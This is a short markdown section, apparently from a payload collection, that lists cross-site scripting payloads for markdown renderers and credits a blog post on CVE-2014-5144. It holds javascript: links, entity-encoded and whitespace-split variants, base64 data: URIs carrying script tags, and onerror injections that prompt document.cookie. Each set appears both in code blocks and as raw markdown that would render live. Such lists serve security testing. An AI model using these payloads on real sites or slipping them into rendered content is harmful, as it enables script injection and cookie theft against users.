## Testing for vulnerabilities

Taken from https://shubs.io/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/

### Example 1

```markdown
[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>  
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)
```

[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>  
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)

### Example 2

```markdown
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)